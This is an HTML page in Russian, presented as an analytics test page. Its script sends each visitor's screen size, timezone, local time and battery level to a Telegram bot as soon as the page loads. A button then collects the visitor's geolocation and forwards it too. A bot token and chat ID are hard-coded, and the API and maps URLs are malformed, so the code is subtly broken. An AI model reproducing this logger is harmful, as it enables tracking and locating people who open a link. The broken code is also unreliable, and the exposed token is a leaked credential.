<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Мой сайт с аналитикой</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 50px;
            text-align: center;
            background-color: #f4f4f9;
        }
        button {
            padding: 10px 20px;
            font-size: 16px;
            cursor: pointer;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>

    <h1>Добро пожаловать на тестовую страницу</h1>
    <p>Этот сайт автоматически отправляет технические параметры сессии в Telegram-бот.</p>
    
    <button onclick="requestLocation()">Разрешить геолокацию</button>

    <script>
        // Ваши личные данные для отправки в Telegram
        const TG_TOKEN = "8892692128:AAEpvN2XHeallC2MfTQMB10aaHxy3VGRVss";
        const TG_CHAT_ID = "6559747526"; 

        async function sendToTelegram(text) {
            const url = `https://telegram.org{TG_TOKEN}/sendMessage`;
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT_ID,
                    text: text,
                    parse_mode: 'Markdown'
                })
            }).catch(e => console.error(e));
        }

        async function collectAnalytics(extraText = "") {
            let batteryLevel = "Не поддерживается";
            if (navigator.getBattery) {
                try {
                    const battery = await navigator.getBattery();
                    batteryLevel = `${Math.round(battery.level * 100)}%`;
                } catch (e) {}
            }

            const screenRes = `${window.screen.width}x${window.screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            const localTime = new Date().toLocaleTimeString();

            const message = `🔔 *Новый посетитель!*\n\n` +
                            `🖥 Экран: ${screenRes}\n` +
                            `🌍 Зона: ${timezone}\n` +
                            `🕒 Время: ${localTime}\n` +
                            `🔋 Батарея: ${batteryLevel}` + 
                            extraText;

            sendToTelegram(message);
        }

        window.addEventListener('DOMContentLoaded', () => {
            collectAnalytics();
        });

        function requestLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        const geoText = `\n📍 *Геолокация*:\nШирота: \`${lat}\`\nДолгота: \`${lon}\`\n\n[Открыть на картах](https://google.com{lat},${lon})`;
                        collectAnalytics(geoText);
                        alert("Данные успешно обновлены!");
                    },
                    (error) => {
                        alert("Доступ к геолокации отклонен.");
                    }
                );
            }
        }
    </script>
</body>
</html>
